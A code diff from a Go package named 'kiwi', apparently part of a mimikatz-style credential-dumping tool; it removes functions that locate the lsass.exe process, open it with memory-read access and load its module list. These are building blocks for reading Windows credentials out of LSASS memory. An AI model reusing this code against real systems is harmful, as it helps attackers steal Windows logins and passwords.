@@ -1,8 +1,6 @@
 package kiwi
 
 import (
-	"sort"
-	"strings"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -29,45 +27,6 @@ func (kiwi *Kiwi) isWow64() (bool, error) {
 		kiwi.wow64 = 2
 	}
 	return wow64, nil
-}
-
-func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
-	if kiwi.pid != 0 {
-		return kiwi.pid, nil
-	}
-	pid, err := api.GetProcessIDByName("lsass.exe")
-	if err != nil {
-		return 0, err
-	}
-	defer func() {
-		kiwi.logf(logger.Info, "PID of lsass.exe is %d", kiwi.pid)
-	}()
-	l := len(pid)
-	if l == 1 {
-		kiwi.pid = pid[0]
-		return kiwi.pid, nil
-	}
-	// if appear multi PID, select minimize
-	ps := make([]int, l)
-	for i := 0; i < l; i++ {
-		ps[i] = int(pid[i])
-	}
-	sort.Ints(ps)
-	kiwi.pid = uint32(ps[0])
-	return kiwi.pid, nil
-}
-
-func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
-	major, _, _ := kiwi.getWindowsVersion()
-	var da uint32 = windows.PROCESS_VM_READ
-	if major < 6 {
-		da |= windows.PROCESS_QUERY_INFORMATION
-	} else {
-		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
-	}
-	return api.OpenProcess(da, false, pid)
 }
 
 type basicModuleInfo struct {
@@ -137,23 +96,4 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 	}
 	kiwi.log(logger.Debug, "loaded module count:", len(modules))
 	return modules, nil
-}
-
-func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle, name string) (*basicModuleInfo, error) {
-	kiwi.modulesRWM.Lock()
-	defer kiwi.modulesRWM.Unlock()
-	if len(kiwi.modules) == 0 {
-		modules, err := kiwi.getVeryBasicModuleInfo(pHandle)
-		if err != nil {
-			return nil, err
-		}
-		kiwi.modules = modules
-		kiwi.log(logger.Info, "load module information about lsass.exe successfully")
-	}
-	for _, module := range kiwi.modules {
-		if strings.ToLower(module.name) == strings.ToLower(name) {
-			return module, nil
-		}
-	}
-	return nil, errors.Errorf("module %s is not exist in lsass.exe", name)
 }
